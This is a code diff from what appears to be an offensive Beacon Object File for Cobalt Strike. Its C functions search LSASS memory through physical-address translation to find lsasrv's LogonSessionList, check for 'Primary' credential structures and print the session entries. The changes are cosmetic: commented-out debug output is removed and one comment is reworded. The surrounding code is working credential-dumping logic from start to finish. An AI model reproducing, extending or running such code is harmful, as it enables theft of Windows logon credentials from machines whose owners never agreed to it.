@@ -66,9 +66,6 @@ DWORD64 IsValidLogonSessionListHead(HANDLE hFile, DWORD64 BasePagePAtoSearch, DW
                         unsigned char* PrimaryStringCheck = ReadMultipleBytes(hFile, 8, primaryCredentialsStructurePA + 0x28, TRUE);
                         if (memcmp(PrimaryStringCheck, "Primary", 8) == 0)
                         {
-                        //#ifdef _DEBUG
-                            //printf("[+] Found Primary string!\n");
-                        //#endif
                             DWORD64 PointerToLogonSessionList = 0;
                             TranslateP2V(PAtoRead, &PointerToLogonSessionList);
                             return PointerToLogonSessionList;
@@ -86,10 +83,6 @@ DWORD64 IsValidLogonSessionListHead(HANDLE hFile, DWORD64 BasePagePAtoSearch, DW
 
 DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWORD lower32bits, DWORD LsassPID, DWORD64 ImageStartAddress)
 {
-//#ifdef _DEBUG
-    //printf("[+] Searching for lsasrv!LogonSessionList in .data section...\n");
-//#endif
-
     DWORD64 BasePageVA = DataSectionBase;
 
     // Check through the pages in .data section and look for potentially valid LIST_ENTRY structures
@@ -104,10 +97,6 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
         BasePageVA += 0x1000;
 
     } while (LogonSessionListHead == 0 && BasePageVA < DataSectionBase + 0x10000);
-
-//#if _DEBUG
-    //printf("[+] Successfully found LogonSessionList pointer in .data section at 0x%llx\n", LogonSessionListHead);
-//#endif
 
     return LogonSessionListHead;
 }
@@ -131,7 +120,7 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
         DWORD64 FlinkPA = 0;
         if (!TranslateUVA2Physical(Flink, &FlinkPA, lower32bits, LsassPID))
         {
-            break; // Breaking out of loop. Invalid address
+            break; // Invalid address, break out of loop
         }
         BeaconFormatPrintf(&outputbuffer, "[%04d] Flink Base Address  : 0x%llx\n", i, Flink);
 
